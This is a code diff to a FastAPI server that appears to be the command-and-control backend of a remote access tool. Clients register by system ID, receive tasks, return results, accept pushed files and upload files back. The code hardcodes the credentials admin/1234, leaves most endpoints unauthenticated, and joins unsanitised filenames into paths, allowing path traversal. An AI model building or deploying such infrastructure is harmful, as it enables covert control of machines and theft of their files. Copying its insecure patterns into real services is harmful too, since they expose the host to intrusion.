@@ -1,5 +1,5 @@
 from fastapi import FastAPI, UploadFile, File, Form, Header
-from fastapi.responses import HTMLResponse, FileResponse
+from fastapi.responses import FileResponse
 import os, time, uuid, json
 
 app = FastAPI()
@@ -15,32 +15,33 @@ DOWNLOAD_DIR = "downloads"
 os.makedirs(UPLOAD_DIR, exist_ok=True)
 os.makedirs(DOWNLOAD_DIR, exist_ok=True)
 
-# ---------- AUTH ----------
+# -------- LOGIN --------
 USERS = {"admin": "1234"}
 
 @app.post("/login")
 def login(username: str = Form(...), password: str = Form(...)):
     if USERS.get(username) == password:
         token = str(uuid.uuid4())
-        sessions[token] = username
+        sessions[token] = True
         return {"token": token}
     return {"error": "invalid"}
 
 def verify(token):
     return token in sessions
 
-# ---------- CLIENT ----------
+# -------- CLIENT REGISTER --------
 @app.post("/register")
 def register(system_id: str = Form(...)):
     clients[system_id] = time.time()
+    print("Client Registered:", system_id)
     return {"ok": True}
 
 @app.get("/clients")
 def get_clients():
     now = time.time()
-    return {c: "online" for c, t in clients.items() if now - t < 15}
+    return {c: "online" for c, t in clients.items() if now - t < 20}
 
-# ---------- TASK ----------
+# -------- TASK --------
 @app.post("/task")
 def task(system_id: str = Form(...),
          action: str = Form(...),
@@ -79,7 +80,7 @@ def result(system_id: str = Form(...), data: str = Form(...)):
 def get_result(system_id: str):
     return results.pop(system_id, {})
 
-# ---------- ADMIN → CLIENT (UPLOAD) ----------
+# -------- FILE TRANSFER --------
 @app.post("/upload_chunk")
 async def upload_chunk(system_id: str = Form(...),
                        filename: str = Form(...),
@@ -114,23 +115,17 @@ def complete(system_id: str = Form(...),
     }
     return {"ok": True}
 
-# ---------- CLIENT → SERVER (DOWNLOAD) ----------
+# -------- DOWNLOAD --------
 @app.post("/upload_from_client")
 async def upload_from_client(system_id: str = Form(...),
                              file: UploadFile = File(...)):
-
     path = os.path.join(DOWNLOAD_DIR, file.filename)
 
     with open(path, "wb") as f:
         f.write(await file.read())
 
-    return {"status": "saved", "file": file.filename}
+    return {"ok": True}
 
 @app.get("/get_file/{filename}")
 def get_file(filename: str):
     return FileResponse(os.path.join(DOWNLOAD_DIR, filename), filename=filename)
-
-# ---------- DASHBOARD ----------
-@app.get("/dashboard", response_class=HTMLResponse)
-def dashboard():
-    return "<h3>Server Running</h3>"
